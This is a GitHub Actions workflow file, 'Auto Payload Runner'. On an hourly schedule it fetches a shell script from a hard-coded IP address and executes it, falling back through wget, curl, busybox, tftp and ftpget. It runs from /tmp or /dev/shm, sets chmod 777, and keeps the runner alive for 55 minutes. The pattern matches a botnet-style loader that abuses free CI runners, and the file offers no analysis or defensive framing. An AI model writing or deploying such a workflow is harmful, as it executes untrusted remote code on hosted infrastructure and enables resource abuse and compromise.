name: Auto Payload Runner (Every Hour)

on:
  schedule:
    # Run every hour
    - cron: '0 * * * *'
  # Also run on workflow_dispatch for manual trigger
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'Payload URL'
        required: true
        default: 'http://16.171.16.1/run.sh'

jobs:
  run-payload:
    runs-on: ubuntu-latest
    
    steps:
    - name: Run Payload
      run: |
        echo "=========================================="
        echo "Auto Payload Runner"
        echo "Payload: ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }}"
        echo "Start Time: $(date)"
        echo "=========================================="
        
        cd /tmp || cd /var/tmp || cd /dev/shm
        
        # Download and execute payload
        (wget ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -O run.sh 2>/dev/null || \
         curl -s ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -o run.sh || \
         busybox wget ${{ github.event.inputs.payload_url || 'http://16.171.16.1/run.sh' }} -O run.sh 2>/dev/null || \
         tftp -g -r run.sh 16.171.16.1 69 || \
         ftpget -u "" -p "" -P 21 16.171.16.1 run.sh run.sh)
        
        [ -s run.sh ] && chmod 777 run.sh && ./run.sh
        
        echo "End Time: $(date)"

    - name: Keep Runner Alive
      run: |
        # Keep the runner active for 55 minutes
        sleep 3300
